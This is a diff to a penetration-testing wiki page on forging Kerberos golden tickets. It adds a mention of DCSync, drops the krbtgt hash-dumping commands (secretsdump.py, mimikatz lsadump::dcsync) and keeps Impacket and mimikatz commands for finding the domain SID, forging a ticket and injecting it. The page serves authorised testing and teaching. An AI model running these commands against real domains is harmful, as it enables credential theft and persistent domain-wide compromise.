@@ -38,7 +38,7 @@ ticketConverter.py $ticket.ccache $ticket.kirbi
 ### Golden ticket
 
 {% hint style="warning" %}
-In order to craft a golden ticket, testers need to find the krbtgt's NT hash or AES key \(128 or 256 bits\). In most cases, this can only be achieved with domain admin privileges. Because of this, golden tickets only allow lateral movement and not privilege escalation.
+In order to craft a golden ticket, testers need to find the `krbtgt`'s NT hash or AES key \(128 or 256 bits\). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](../credentials/dumping/dcsync.md). Because of this, golden tickets only allow lateral movement and not privilege escalation.
 {% endhint %}
 
 {% hint style="success" %}
@@ -50,9 +50,6 @@ Microsoft now uses AES 256 bits by default. Using this encryption algorithm \(in
 There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.
 
 ```bash
-# Retrieve the krbtgt NT hash or AES key
-secretsdump.py -just-dc-user krbtgt -hashes 'LMhash:NThash' 'DOMAIN/DomainAdmin@DomainController'
-
 # Find the domain SID
 lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
 
@@ -65,12 +62,9 @@ ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomu
 {% endtab %}
 
 {% tab title="Windows" %}
-On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used.
+On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) \(C\) can be used for this attack.
 
 ```bash
-# Retrieve the krbtgt NT hash or AES keys
-lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
-
 # with an NT hash
 kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt
 
